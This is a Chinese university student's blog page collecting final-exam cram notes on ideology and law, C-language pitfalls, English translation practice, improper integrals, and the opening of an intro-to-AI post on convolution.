<p>是决胜全面建成小康社会，进而全面建设社会主义现代化强国的时代</p>
<p>是全国各族人民团结奋斗，不断创造美好生活，逐步实现全体人民共同富裕的时代</p>
<p>是全体中华儿女勠力同心，奋力实现中华民族伟大复兴的中国梦的时代</p>
<p>是我国不断为人类作出更大贡献的时代</p>
<p>**关键词 **</p>
<p>继续夺取中国特色社会主义伟大胜利</p>
<p>两个全面</p>
<p>团结奋斗 共同富裕</p>
<p>中国梦</p>
<p>对世界的贡献</p>
<h3 id="我们怎么做"><a href="#我们怎么做" class="headerlink" title="我们怎么做?"></a>我们怎么做?</h3><p>肩负历史使命，坚定前进信心</p>
<p>立大志，明大德，成大才，担大任，让青春贡献蓬勃力量(立名承担)</p>
<h3 id="人的本质是一切社会关系的总和"><a href="#人的本质是一切社会关系的总和" class="headerlink" title="人的本质是一切社会关系的总和"></a><strong>人的本质是一切社会关系的总和</strong></h3><h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h3 id="社会属性是人的本质属性"><a href="#社会属性是人的本质属性" class="headerlink" title="社会属性是人的本质属性"></a>社会属性是人的本质属性</h3><h3 id="个人与社会的关系-2-点"><a href="#个人与社会的关系-2-点" class="headerlink" title="个人与社会的关系 2 点"></a>个人与社会的关系 2 点</h3><p>对立统一，相互依存，相互制约，相互促进(个人和社会相互依存制约等)</p>
<p>社会利益离不开个人利益，个人利益离不开社会利益(个人利益与社会利益相互依存)</p>
<h3 id="服务人民，奉献社会的人生追求过时了吗"><a href="#服务人民，奉献社会的人生追求过时了吗" class="headerlink" title="服务人民，奉献社会的人生追求过时了吗"></a>服务人民，奉献社会的人生追求过时了吗</h3><p>只有确立，才能把握人生奋斗目标(目标)未来</p>
<p>只有确立，才能以正确态度对待人生(态度)现在</p>
<p>只有确立，才能懂得人生价值(在于奉献)(价值)过去</p>
<h3 id="人生态度-4-点"><a href="#人生态度-4-点" class="headerlink" title="人生态度 4 点"></a>人生态度 4 点</h3><p>人生须认真 务实 乐观 进取(任务 yue 进)</p>
<h3 id="正确评价人生价值-4-点"><a href="#正确评价人生价值-4-点" class="headerlink" title="正确评价人生价值 4 点"></a>正确评价人生价值 4 点</h3><p>贡献大小 尽力程度 对社会和历史的作用 物质和精神</p>
<h3 id="如何实现人生价值-3-点-客观与主观"><a href="#如何实现人生价值-3-点-客观与主观" class="headerlink" title="如何实现人生价值 3 点(客观与主观)"></a>如何实现人生价值 3 点(客观与主观)</h3><p>从社会客观条件出发</p>
<p>从个体自身条件出发</p>
<p>提高实现的能力</p>
<h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><h3 id="创造有意义的人生"><a href="#创造有意义的人生" class="headerlink" title="创造有意义的人生"></a>创造有意义的人生</h3><p>结合历史（同行） 祖国（同向） 人民（同在）</p>
<h3 id="理想与实践"><a href="#理想与实践" class="headerlink" title="理想与实践"></a>理想与实践</h3><p>理想具有实践性</p>
<p>理想在实践中产生和发展，理想的实现离不开实践</p>
<h3 id="理想信念的作用-原因"><a href="#理想信念的作用-原因" class="headerlink" title="*理想信念的作用(原因)"></a>*理想信念的作用(原因)</h3><p><strong>行动上(先昭示目标，再催生动力)</strong></p>
<p>理想信念昭示奋斗目标</p>
<p>理想信念催生前进动力</p>
<p><strong>精神上(先提供支柱，再提高境界)</strong></p>
<p>理想信念提供精神支柱</p>
<p>理想信念提高精神境界</p>
<h3 id="马克思主义的基本特征-党-科学-民主-实践-开放"><a href="#马克思主义的基本特征-党-科学-民主-实践-开放" class="headerlink" title="马克思主义的基本特征(党 科学 民主 实践 开放)"></a>马克思主义的基本特征(党 科学 民主 实践 开放)</h3><p>作为党的理论指导</p>
<p>科学的理论 创造性揭示人类社会发展规律</p>
<p>人民的理论 创立人民实现自身解放的思想体系</p>
<p>实践的理论 指引人民改造世界的行动</p>
<p>不断发展和开放的理论 始终站在时代前沿</p>
<h2 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h2><h3 id="中国精神的内涵-团结奋斗-创造梦想"><a href="#中国精神的内涵-团结奋斗-创造梦想" class="headerlink" title="中国精神的内涵(团结奋斗 创造梦想)"></a>中国精神的内涵(团结奋斗 创造梦想)</h3><p>伟大创造精神</p>
<p>伟大梦想精神</p>
<p>伟大奋斗精神</p>
<p>伟大团结精神</p>
<h3 id="伟大建党精神是中国共产党的精神之源"><a href="#伟大建党精神是中国共产党的精神之源" class="headerlink" title="伟大建党精神是中国共产党的精神之源"></a>伟大建党精神是中国共产党的精神之源</h3><p><strong>思想上:</strong></p>
<p>坚持真理 坚守理想</p>
<p><strong>行动上:</strong></p>
<p>践行初心 担当使命</p>
<p>不怕牺牲 英勇斗争</p>
<p>对党忠诚 不负人民</p>
<p>坚持双理 英勇牺牲 不忘初心 党和人民</p>
<h3 id="爱国主义的基本内涵-民族精神以其为核心"><a href="#爱国主义的基本内涵-民族精神以其为核心" class="headerlink" title="爱国主义的基本内涵(民族精神以其为核心)"></a>爱国主义的基本内涵(民族精神以其为核心)</h3><p>爱自己的国家 天</p>
<p>爱祖国大好河山 地</p>
<p>爱自己骨肉同胞 人</p>
<p>爱祖国灿烂文化 精神</p>
<h3 id="爱国主义的本质"><a href="#爱国主义的本质" class="headerlink" title="爱国主义的本质"></a>爱国主义的本质</h3><p>坚持爱国爱党，爱社会主义(没有爱人民)的高度统一</p>
<h2 id="Day5"><a href="#Day5" class="headerlink" title="Day5"></a>Day5</h2><h3 id="社会主义核心价值观的显著特征-可信-先进-伦理"><a href="#社会主义核心价值观的显著特征-可信-先进-伦理" class="headerlink" title="社会主义核心价值观的显著特征(可信 先进 伦理)"></a>社会主义核心价值观的显著特征(可信 先进 伦理)</h3><p>真实可信性:因真实可信而具有强大道义力量</p>
<p>社会先进性:反映人类社会发展进步的价值理念</p>
<p>人民伦理性:彰显人民至上的价值立场</p>
<h3 id="如何践行社会主义核心价值观"><a href="#如何践行社会主义核心价值观" class="headerlink" title="如何践行社会主义核心价值观"></a>如何践行社会主义核心价值观</h3><p>勤学 明辨 修德 笃实</p>
<p>(QMXD)</p>
<h3 id="道德产生的条件-劳动-人与社会"><a href="#道德产生的条件-劳动-人与社会" class="headerlink" title="道德产生的条件 劳动 人与社会"></a>道德产生的条件 劳动 人与社会</h3><p>劳动是首要前提</p>
<p>人的自我意识是主观条件</p>
<p>社会关系是客观条件</p>
<h3 id="如何遵守网络生活的道德要求"><a href="#如何遵守网络生活的道德要求" class="headerlink" title="如何遵守网络生活的道德要求"></a>如何遵守网络生活的道德要求</h3><p>正确使用网络工具(不要用 Burp 抓包 乱传木马)</p>
<p>加强网络文明自律(个人要自律)</p>
<p>营造良好网络道德环境(群体要营造环境)</p>
<p>工具 自律 环境</p>
<h2 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h2><h3 id="法律的定义"><a href="#法律的定义" class="headerlink" title="法律的定义"></a>法律的定义</h3><p>法律是由国家制定或认可并由国家强制力保证实施的，反映由特定社会物质生活条件所决定的</p>
<p>统治阶级意志的规范体系</p>
<h3 id="我国社会主义法律的本质特征"><a href="#我国社会主义法律的本质特征" class="headerlink" title="我国社会主义法律的本质特征"></a>我国社会主义法律的本质特征</h3><p>体现党的主张和人民意志的统一</p>
<p>具有科学性和先进性</p>
<p>是中国特色社会主义建设的重要保障</p>
<h3 id="法治思维的内涵"><a href="#法治思维的内涵" class="headerlink" title="法治思维的内涵"></a>法治思维的内涵</h3><p>正当性思维</p>
<p>规范思维</p>
<p>逻辑思维</p>
<p>科学思维</p>
<h2 id="Day7"><a href="#Day7" class="headerlink" title="Day7"></a>Day7</h2><h3 id="道德的含义-指导作用"><a href="#道德的含义-指导作用" class="headerlink" title="*道德的含义(指导作用)"></a>*道德的含义(指导作用)</h3><p>以指导人的行为为目的，以形成人的正确行为方式为内容的精神</p>
<p>指导行为 形成正确</p>
<h3 id="道德的作用-行动-精神-社会"><a href="#道德的作用-行动-精神-社会" class="headerlink" title="道德的作用 行动 精神 社会"></a>道德的作用 行动 精神 社会</h3><p>维系社会稳定 促进国家发展 社会上维持</p>
<p>激励人们改造客观和主观世界 行动上改造</p>
<p>提高精神境界 促进人的全面发展 精神上全面</p>
<h2 id="Day8"><a href="#Day8" class="headerlink" title="Day8"></a>Day8</h2><h3 id="人生目的在人生实践中的作用"><a href="#人生目的在人生实践中的作用" class="headerlink" title="人生目的在人生实践中的作用"></a>人生目的在人生实践中的作用</h3><p>决定人生道路 人生态度 人生价值选择(与服务人民奉献社会的人生追求相似，多个选择)</p>
<p><a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/TspiwAKRyiw4lJkuQCxcdwxenbb#share-RgEldRJJHoa5x0xWFL5cKOVbnub">期末突击-思想道德与法治</a></p>
<h3 id="大学生如何走在改革创新时代前列"><a href="#大学生如何走在改革创新时代前列" class="headerlink" title="大学生如何走在改革创新时代前列"></a>大学生如何走在改革创新时代前列</h3><p>把握时代脉搏 迎接时代挑战</p>
<p>思想上树立改革创新自觉意识</p>
<p>行动上增强改革创新能力</p>
<h3 id="社会主义核心价值观与其价值体系的关系-相辅相成-高度凝练-集中表达-内在一致"><a href="#社会主义核心价值观与其价值体系的关系-相辅相成-高度凝练-集中表达-内在一致" class="headerlink" title="*社会主义核心价值观与其价值体系的关系 相辅相成 高度凝练 集中表达 内在一致"></a>*社会主义核心价值观与其价值体系的关系 相辅相成 高度凝练 集中表达 内在一致</h3><p>紧密联系 互为依存 相辅相成</p>
<p>价值观是价值体系高度凝练和集中表达</p>
<p>再结合国情答社会主义核心价值观的特征</p>
<p>具有内在一致性 体现社会主义制度在思想和精神上 以及中国梦的价值引领</p>
<p>依存 + 凝练 + 一致 + 引领</p>
<h2 id="Day9"><a href="#Day9" class="headerlink" title="Day9"></a>Day9</h2><h3 id="中华传统美德的基本精神"><a href="#中华传统美德的基本精神" class="headerlink" title="中华传统美德的基本精神"></a>中华传统美德的基本精神</h3><p>整体利益 责任奉献</p>
<p>仁爱原则 以和为贵</p>
<p>道德修养 道德义务</p>
<p>精神境界 理想人格</p>
<h3 id="职业生活中的基本道德规范"><a href="#职业生活中的基本道德规范" class="headerlink" title="职业生活中的基本道德规范"></a>职业生活中的基本道德规范</h3><p>公(正)道 奉献 敬业 诚信 友善(热情)</p>
<h3 id="我国宪法的基本原则"><a href="#我国宪法的基本原则" class="headerlink" title="我国宪法的基本原则"></a>我国宪法的基本原则</h3><p><strong>领导:</strong></p>
<p>中国共产党领导</p>
<p><strong>民主:</strong></p>
<p>人民当家做主</p>
<p>尊重和保障人权</p>
<p><strong>制度:</strong></p>
<p>社会主义法治</p>
<p>民主集中制</p>
<h3 id="信仰马克思主义的原因-观察事物-科学指引"><a href="#信仰马克思主义的原因-观察事物-科学指引" class="headerlink" title="信仰马克思主义的原因 观察事物 科学指引"></a>信仰马克思主义的原因 观察事物 科学指引</h3><p>马克思主义的优点</p>
<p>有利于我们认识和观察事物</p>
<p>以科学的理想信念指引人生</p>
<h3 id="个人理想和社会理想"><a href="#个人理想和社会理想" class="headerlink" title="个人理想和社会理想"></a>个人理想和社会理想</h3><p>参考个人利益与社会利益</p>
<p>个人理想以社会理想为指引</p>
<p>社会理想是对个人理想的汇聚和升华</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2026/01/15/%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB-C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/01/15/%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB-C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/" class="post-title-link" itemprop="url">期末突击-C语言程序设计</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2026-01-15 15:20:00" itemprop="dateCreated datePublished" datetime="2026-01-15T15:20:00+08:00">2026-01-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-21 01:04:39" itemprop="dateModified" datetime="2026-01-21T01:04:39+08:00">2026-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/schedule/" itemprop="url" rel="index"><span itemprop="name">-schedule</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="期末突击-C-语言程序设计"><a href="#期末突击-C-语言程序设计" class="headerlink" title="期末突击-C 语言程序设计"></a>期末突击-C 语言程序设计</h1><p>1.注释语句不可以嵌套</p>
<p>2.(int)强制类型转换要加括号</p>
<p>3.L 只用于长整型标识 1.111e3L 不合法</p>
<p>4.0x+ 数字表示十六进制整形常量,0 开头则为八进制整形常量 无位数限制，按类型范围截断</p>
<p>\x+ 数字作为字符转义 <strong>会返回 16 进制对应 ASCII 码值的字符 这里要注意不是\0x 取位限制两位至 255</strong></p>
<p>+数字则是 8 进制 <strong>只取前三位</strong></p>
<p>如果你要输出这些进制的数，会直接输出，不会带这些符号</p>
<p>例如用 %x 输出 16 输出的是 10 不是 0x10</p>
<p>%x 十六进制 %o 八进制</p>
<p>5.负数按补码存 源码取反再加一是补码</p>
<p>6.scanf 中 %d 也是贪婪匹配</p>
<p>7.%d 输出浮点类型直接 0，注意是不是用 %d 输出的</p>
<p>但 %f 能输出整型，带.0</p>
<p>8.整型常量的除法返回值一定是整型，无论接的变量的数据类型</p>
<p>Float a&#x3D;2&#x2F;3 a 还是等于 0</p>
<p>所以小数初始化除数一定一定要加.0 啊</p>
<p>9.逗号表达式优先级最低，小于赋值表达式</p>
<p>10.if 后紧跟 else 不能有别的语句</p>
<p>if(a&#x3D;&#x3D;1)b&#x3D;2;c&#x3D;3;else d&#x3D;4;不合法</p>
<p>11.符号常量可以用来声明数组</p>
<p>12.static 改变的是函数的生存期 而非作用域;只是数值不刷新 还是不能域外引用</p>
<p>13.关注函数中变量的初始值,有的根本不是 0</p>
<p>14.阶乘用递归</p>
<p>15.宏定义函数不会添括号，只是字符替换</p>
<p>16.函数的形参会占用(栈区的)存储单元</p>
<p>17.fwrite 专门向文件写入数据块</p>
<p>18.scanf 的第一个参数一定是字符串常量</p>
<p>19.<code>switch</code> 后的表达式必须是<strong>整型类型;</strong><code>case</code> 后的<strong>标签必须是整型常量表达式</strong>（比如 <code>10</code>、<code>&#39;a&#39;</code>、<code>3+5</code> 等），<strong>绝对不能是浮点数</strong>（如 <code>3.14</code>、<code>2.0</code>），也不能是变量、浮点表达式</p>
<p>20.C 语言中 main 函数必须返回 int 类型值</p>
<p>21.sizeof 是一个运算符 而不是函数 因为 sizeof 括号可选</p>
<p>22.#include &lt;stdio.h&gt; 用于引入标准输入输出库</p>
<p>23.文件指针的位置由打开方式决定 并不是总是从头开始</p>
<p>24.C 语言中数组下标不能是负数</p>
<p>25.C 语言中语句必须以;结尾</p>
<p>26.scanf 函数的第一个参数必须是字符串常量</p>
<p>27.在 C 语言中，<strong>所有函数之外定义的变量</strong> 被称为 <strong>全局变量</strong></p>
<p>在函数内部才是自动变量</p>
<p>28.C 语言中，**数组下标 <strong><strong>[]</strong></strong> 的优先级高于解引用 *******，所以声明一个指向含有 10 个元素的一维字符型数组的指针，即先用[]判断是不是数组 再用*判断是不是指针</p>
<p><img src="/images/BMeNbMdT4ow1gvx3QzHcg9ZcnKg.png"></p>
<p>29.指针相减返回的是元素个数，不是字节数</p>
<p>30.gets,strcpy,scanf 都不会检查缓冲区溢出的问题</p>
<p>31.malloc 返回的指针所指向的内存空间不会自动初始化</p>
<p>32.C 语言中全局变量在程序中任何位置都可以访问</p>
<p>33.<strong>和指针直接相关的操作里，</strong>******* 永远干不过 <strong><strong>[]</strong></strong>&#x2F;<strong><strong>()</strong></strong>&#x2F; 后置****++**—— 这就是为什么 <code>*p++</code> 是 <code>*(p++)</code>，<code>*arr[0]</code> 是 <code>*(arr[0])</code>，而不是你直觉里的 <code>(*p)++</code>&#x2F;<code>(*arr)[0]</code>。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2026/01/15/%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB-%E5%A4%A7%E5%AD%A6%E8%8B%B1%E8%AF%AD1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/01/15/%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB-%E5%A4%A7%E5%AD%A6%E8%8B%B1%E8%AF%AD1/" class="post-title-link" itemprop="url">期末突击-大学英语1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2026-01-15 10:20:00" itemprop="dateCreated datePublished" datetime="2026-01-15T10:20:00+08:00">2026-01-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-21 01:04:48" itemprop="dateModified" datetime="2026-01-21T01:04:48+08:00">2026-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/schedule/" itemprop="url" rel="index"><span itemprop="name">-schedule</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="期末突击-大学英语-1"><a href="#期末突击-大学英语-1" class="headerlink" title="期末突击-大学英语 1"></a>期末突击-大学英语 1</h1><h2 id="Unit-1"><a href="#Unit-1" class="headerlink" title="Unit 1"></a>Unit 1</h2><ol>
<li>孔子（Confucius）是中国历史上著名的思想家、教育家，是儒家学派（Confucianism）的创始人。</li>
</ol>
<p>Confucius was a well-known thinker and educator in Chinese history. He was the founder of Confucianism.</p>
<ol start="2">
<li>《论语》（The Analects）收录了孔子的思想。它是中国古代文化的经典著作（classic），对后来历代思想家和文学家产生了很大影响。</li>
</ol>
<p>The Analects is a collection of the thoughts of Confucius. It is a classic of ancient Chinese culture, and it has had a great influence on the thinkers and writers of later generations(后来历代).</p>
<ol start="3">
<li>如今，孔子的学说不仅受到中国人的重视，也越来越得到整个国际社会的关注。</li>
</ol>
<p>Nowadays, the teachings of Confucius are not only valued by the Chinese people, but are also attracting increasing attention from the international community(国际社会).</p>
<h2 id="Unit-2"><a href="#Unit-2" class="headerlink" title="Unit 2"></a>Unit 2</h2><ol>
<li>孝道（ filial piety ）是中国古代社会的基本道德规范（ code of ethics ）之一。</li>
</ol>
<p>Filial piety is one of the basic codes of ethics in ancient Chinese society.</p>
<ol start="2">
<li>一般来说，孝道指子女对父母应尽的义务，主要包括尊敬、关爱及赡养老人。</li>
</ol>
<p>Generally speaking, filial piety refers to children’s obligations to their parents, mainly including respect, care, and support(赡养) for the elderly.</p>
<ol start="3">
<li>孝道是中国社会千百年来维系家庭关系的道德准则。它毫无疑问是中华民族的一种传统美德。</li>
</ol>
<p>In Chinese society, filial piety has been the moral standard for maintaining family relationships(维系家庭关系) for thousands of years. It is undoubtedly a traditional Chinese virtue.</p>
<h2 id="Unit-3"><a href="#Unit-3" class="headerlink" title="Unit 3"></a>Unit 3</h2><ol>
<li>郑和 1371 年出生于云南昆明，他不仅是明朝的外交家（ diplomat ），也是中国历史上最著名的海上探险家（ maritime explorer ）。</li>
</ol>
<p>Zheng He, born in 1371 in Kunming, Yunnan, was not only a diplomat in the Ming Dynasty but also the most famous maritime explorer in Chinese history.</p>
<ol start="2">
<li>从公元 1405 年起的 28 年间，郑和带领船队七下西洋（ the Western Seas ），出海的人员共计 10 多万人，访问了 30 多个国家和地区。</li>
</ol>
<p>In the 28 years after 1405 AD, Zheng He led his fleet to make seven voyages to the Western Seas with over 100,000 crew members in total, and they visited more than 30 countries and regions.</p>
<ol start="3">
<li>郑和下西洋是世界航海 （ navigation ） 史上的壮举，加强了明朝和海外各国之间的关系。</li>
</ol>
<p>Zheng He’s voyages to the Western Seas were a great achievement in the world’s navigation history. They strengthened the relationships between the Ming Dynasty and countries overseas.</p>
<h2 id="Unit-4"><a href="#Unit-4" class="headerlink" title="Unit 4"></a>Unit 4</h2><ol>
<li>随着互联网技术的发展，数字化教育使人们得以通过互联网进入虚拟教室，并随时随地学习。</li>
</ol>
<p>With the development of Internet technology, digital education enables people to get access to virtual classes through the Internet and learn anytime and anywhere.</p>
<ol start="2">
<li>数字化教育拓展了学习者学习的时间和空间，为终身学习提供了更多的可能性。</li>
</ol>
<p>Digital education expands the learner’s time and space for learning, thus providing more possibilities for lifelong learning.</p>
<ol start="3">
<li>中国将坚持教育优先发展，推进教育数字化，建设学习型社会、学习型大国。</li>
</ol>
<p>China will continue to give high priority to the development of education, promote the digitalization of education, and build a society and country of learning(学习型的).</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2026/01/13/%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB-%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6A1%E4%B8%8A/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/01/13/%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB-%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6A1%E4%B8%8A/" class="post-title-link" itemprop="url">期末突击-高等数学A1上</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2026-01-13 10:20:00" itemprop="dateCreated datePublished" datetime="2026-01-13T10:20:00+08:00">2026-01-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-21 01:09:49" itemprop="dateModified" datetime="2026-01-21T01:09:49+08:00">2026-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/schedule/" itemprop="url" rel="index"><span itemprop="name">-schedule</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="期末专题-判断反常积分的敛散性"><a href="#期末专题-判断反常积分的敛散性" class="headerlink" title="期末专题 判断反常积分的敛散性"></a>期末专题 判断反常积分的敛散性</h1><h2 id="直接判别法"><a href="#直接判别法" class="headerlink" title="直接判别法"></a>直接判别法</h2><p><img src="/images/F7OJbnynwojeo9xLTw0cn0bunUg.png"></p>
<p>没有 ln 视为 β 等于 0,仍然发散</p>
<p>x 增长速度更快，先看 x 再看 lnx</p>
<p><strong>如何理解?</strong></p>
<p>上下限有一个含无穷，如果要收敛，则你希望原函数分母值更大，<strong>分母次数应该更大</strong>，x 趋于无穷则原函数趋于 0</p>
<p>上下限有一个为 0 实际上同理，你应该希望原函数 0 出现在分子，<strong>分母次数应该更小</strong>，注意 1 次都是发散的</p>
<p><img src="/images/HUxmbx76BoSozux0T2fcrF3MnMh.png"></p>
<h2 id="比较判别法"><a href="#比较判别法" class="headerlink" title="比较判别法"></a>比较判别法</h2><h3 id="放缩法"><a href="#放缩法" class="headerlink" title="放缩法"></a>放缩法</h3><p><img src="/images/Bnp8bgu7MoCfxUxhvfXcnkILnfc.png"></p>
<p>比如 A，可以进行放缩</p>
<p><img src="/images/Dv7LbGnkYoyv3mx7goucLQ6Enec.png"></p>
<h3 id="等价-同阶-法"><a href="#等价-同阶-法" class="headerlink" title="等价(同阶)法"></a>等价(同阶)法</h3><p><img src="/images/J7CYbksv8oJZk4xhoULcsZCDnob.png"></p>
<p>此方法配合”抓大头”同样适用，分母可以取”大头”2x</p>
<p>注意 x 趋于无穷或者 0 的时候，”大头”是不同的</p>
<p><img src="/images/CPv0bvAwRo4MUNxOBdtcA1e2nCe.png"></p>
<h2 id="总结和例题"><a href="#总结和例题" class="headerlink" title="总结和例题"></a>总结和例题</h2><p>审敛法，不一定要计算出定积分或反常积分的值，可以观察原函数的特点，运用放缩，等价等等方法，让函数形状与直接判别法的形状相似.</p>
<p>来个例题，<strong>这里答案应该是收敛</strong></p>
<p><img src="/images/AMQKbSLbZo1uWcxVQj9c3v30nBf.png"></p>
<p>反常积分上下限都是瑕点，我们必须把它们拆成两个积分</p>
<p>而拆成两个积分以后，抓大放小所得的积分是不同的，对于 0 应该等价于 1&#x2F;(x 的 1&#x2F;2 次方)，对于正无穷应该是 1&#x2F;</p>
<p>(x 的 3&#x2F;2 次方)</p>
<p>正无穷时我们希望分母次数更大，它确实大于 1，为收敛</p>
<p>0 时我们希望分母次数更小，它确实小于 1，也为收敛</p>
<p>故原反常积分收敛</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2026/01/12/%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB-%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/01/12/%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB-%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/" class="post-title-link" itemprop="url">期末突击-人工智能导论</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2026-01-12 19:20:00" itemprop="dateCreated datePublished" datetime="2026-01-12T19:20:00+08:00">2026-01-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-21 01:08:01" itemprop="dateModified" datetime="2026-01-21T01:08:01+08:00">2026-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/schedule/" itemprop="url" rel="index"><span itemprop="name">-schedule</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="优秀率-1-期末突击-人工智能导论"><a href="#优秀率-1-期末突击-人工智能导论" class="headerlink" title="(优秀率-&#x2F;1)期末突击-人工智能导论"></a>(优秀率-&#x2F;1)期末突击-人工智能导论</h1><h1 id="计算题"><a href="#计算题" class="headerlink" title="计算题"></a>计算题</h1><h2 id="卷积操作"><a href="#卷积操作" class="headerlink" title="卷积操作"></a>卷积操作</h2><p><img src="/images/AYJKbNoeloJ1yvxydWHcbCuNndh.png"></p>
<p>第一个乘数叫原图像 第二个乘数叫卷积核 即过滤器</p>
